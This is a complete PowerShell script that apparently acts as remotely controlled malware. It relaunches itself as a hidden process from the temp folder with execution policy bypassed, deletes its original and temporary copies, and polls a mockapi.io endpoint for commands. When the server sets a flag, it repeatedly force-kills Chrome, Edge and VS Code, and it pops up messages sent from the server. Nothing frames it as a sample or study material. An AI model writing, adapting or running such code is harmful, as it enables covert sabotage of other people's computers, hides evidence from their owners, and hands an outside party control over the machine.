param(
    [switch]$IsTempInstance,
    [string]$OriginalScriptPath = ""
)

if (-not $IsTempInstance.IsPresent) {
    Write-Host "Starting initial script instance..." -ForegroundColor Gray

    $currentScriptPath = $MyInvocation.MyCommand.Path

    $tempScriptPath = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".ps1")
    Write-Host "Creating temporary script at: $tempScriptPath" -ForegroundColor Gray

    try {
        Get-Content -Path $currentScriptPath -Raw | Out-File -FilePath $tempScriptPath -Encoding UTF8 -Force

        $arguments = @(
            "-NoProfile"
            "-ExecutionPolicy", "Bypass"
            "-File", "`"$tempScriptPath`""
            "-IsTempInstance"
            "-OriginalScriptPath", "`"$currentScriptPath`""
        )

        Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden -PassThru

        exit 0 
    } catch {
        Write-Error "Failed to create or launch temporary instance: $($_.Exception.Message)"
        exit 1
    }
} else {
    Write-Host "Running from temporary location: $($MyInvocation.MyCommand.Path)" -ForegroundColor Cyan

    if (-not [string]::IsNullOrEmpty($OriginalScriptPath) -and (Test-Path $OriginalScriptPath)) {
        try {
            $tempScriptSelfPath = $MyInvocation.MyCommand.Path
            $deleteCommand = "Start-Sleep -Seconds 5; Remove-Item -Path `"$OriginalScriptPath`" -Force -ErrorAction SilentlyContinue; Remove-Item -Path `"$tempScriptSelfPath`" -Force -ErrorAction SilentlyContinue"

            $deleteArguments = @(
                "-NoProfile"
                "-ExecutionPolicy", "Bypass"
                "-Command", $deleteCommand
            )
            Start-Process powershell.exe -ArgumentList $deleteArguments -WindowStyle Hidden
        } catch {
            Write-Warning "Failed to schedule deletion of original/temporary script: $($_.Exception.Message)"
        }
    } else {
        Write-Warning "Original script path '$OriginalScriptPath' not provided or not found. Skipping deletion scheduling."
    }

    Write-Host "Proceeding with main script logic from temporary instance..." -ForegroundColor Cyan
}

Add-Type -AssemblyName System.Windows.Forms

$global:isActive = $null
$global:message = $null
$global:messageIncr = $null
$global:lastMessageIncr = ""

function checkDataBase {
    try {
        $response = Invoke-RestMethod -Uri "https://68138d49129f6313e211a66e.mockapi.io/management" -Method Get -TimeoutSec 10
        
        if ($response -ne $null) {
             $global:isActive = $response.isActive
             if ($response.message -ne $null) {
                 $global:message = $response.message.message
                 $global:messageIncr = $response.message.incr
             } else {
                 Write-Warning "API response structure missing 'message' property."
                 $global:message = $null
                 $global:messageIncr = $null
             }
        } else {
            Write-Warning "API response was null."
            $global:isActive = $null
            $global:message = $null
            $global:messageIncr = $null
        }
    } catch {
        Write-Error "Error checking database: $($_.Exception.Message)"
        $global:isActive = $null
        $global:message = $null
        $global:messageIncr = $null
    }
}

function closeApp {
    $blacklist = @('chrome', 'msedge', 'code')

    Write-Host "Starting application killer..." -ForegroundColor Magenta
    while ($true) {
        Get-Process | Where-Object { $blacklist -contains $_.ProcessName } | ForEach-Object {
            try {
                Stop-Process -Id $_.Id -Force -ErrorAction Stop
                Write-Host "Blocked/Closed process: $($_.ProcessName) (ID: $($_.Id))" -ForegroundColor Red
            } catch {
                Write-Warning "Failed to stop process $($_.ProcessName) (ID: $($_.Id)): $($_.Exception.Message)"
            }
        }
        Start-Sleep -Milliseconds 500
    }
}

function showMessageBox {
    param (
        [string]$messageContent,
        [string]$title = "System Message"
    )
    [System.Windows.Forms.MessageBox]::Show($messageContent, $title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
}

function main {

    $jobCloseApp = $null
    $isRunning = $false

    Write-Host "Performing initial database check..."
    checkDataBase
    if ($null -ne $global:messageIncr) {
        $global:lastMessageIncr = $global:messageIncr
    } else {
        Write-Warning "Initial database check failed or returned null increment. Last message check might be inaccurate initially."
        $global:lastMessageIncr = [System.Guid]::NewGuid().ToString()
    }

    # Main loop
    while ($true) {
        checkDataBase

        if ($null -ne $global:isActive) {
            Write-Host "Status Check: isActive = $global:isActive, messageIncr = $global:messageIncr, lastMessageIncr = $global:lastMessageIncr" -ForegroundColor Cyan

            if ($global:messageIncr -ne $global:lastMessageIncr) {
                Write-Host "Message increment changed from '$($global:lastMessageIncr)' to '$($global:messageIncr)'." -ForegroundColor White
                if (-not [string]::IsNullOrEmpty($global:messageIncr)) {
                    Write-Host "Displaying message: '$($global:message)'" -ForegroundColor White
                    Start-Job -ScriptBlock {
                        param($msg, $title)
                        Add-Type -AssemblyName System.Windows.Forms
                        [System.Windows.Forms.MessageBox]::Show($msg, $title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
                    } -ArgumentList $global:message, "Notification" | Out-Null
                }
                $global:lastMessageIncr = $global:messageIncr
            }

            if ($global:isActive -and -not $isRunning) {
                Write-Host "isActive is true. Starting killer job..." -ForegroundColor Green
                try {
                    $jobCloseApp = Start-Job -ScriptBlock ${function:closeApp}

                    if ($jobCloseApp) {
                        $isRunning = $true
                        Write-Host "Killer job started successfully (State: $($jobCloseApp.State))." -ForegroundColor Green
                    } else {
                        Write-Warning "Start-Job did not return a job object."
                    }
                } catch {
                    Write-Error "Error starting killer job: $($_.Exception.Message)"
                    $isRunning = $false
                }
            }
            elseif (-not $global:isActive -and $isRunning) {
                Write-Host "isActive is false. Stopping killer job..." -ForegroundColor Yellow
                if ($null -ne $jobCloseApp) {
                    try {
                        Stop-Job -Job $jobCloseApp -PassThru -ErrorAction SilentlyContinue | Wait-Job -Timeout 10 -ErrorAction SilentlyContinue
                        Remove-Job -Job $jobCloseApp -Force -ErrorAction SilentlyContinue
                        Write-Host "Killer job stopped and removed." -ForegroundColor Yellow
                    } catch {
                        Write-Error "Error stopping/removing killer job: $($_.Exception.Message)"
                        Remove-Job -Job $jobCloseApp -Force -ErrorAction SilentlyContinue
                    } finally {
                        $jobCloseApp = $null
                        $isRunning = $false
                    }
                } else {
                    Write-Warning "Killer job should be stopped, but the job object reference was lost. Resetting flag."
                    $isRunning = $false
                }
            }
        } else {
            Write-Warning "Database check failed (isActive is null). Skipping logic iteration."
            if ($isRunning -and $null -ne $jobCloseApp) {
                 Write-Warning "Stopping killer job due to database communication failure."
                 Stop-Job -Job $jobCloseApp -ErrorAction SilentlyContinue | Wait-Job -Timeout 5 -ErrorAction SilentlyContinue
                 Remove-Job -Job $jobCloseApp -Force -ErrorAction SilentlyContinue
                 $jobCloseApp = $null
                 $isRunning = $false
            }
        }

        Get-Job | Where-Object { $_.State -eq 'Completed' -or $_.State -eq 'Failed' -or $_.State -eq 'Stopped' } | Remove-Job -Force

        Write-Host "Sleeping for 10 seconds..." -ForegroundColor Gray
        Start-Sleep -Seconds 10
    }
}


main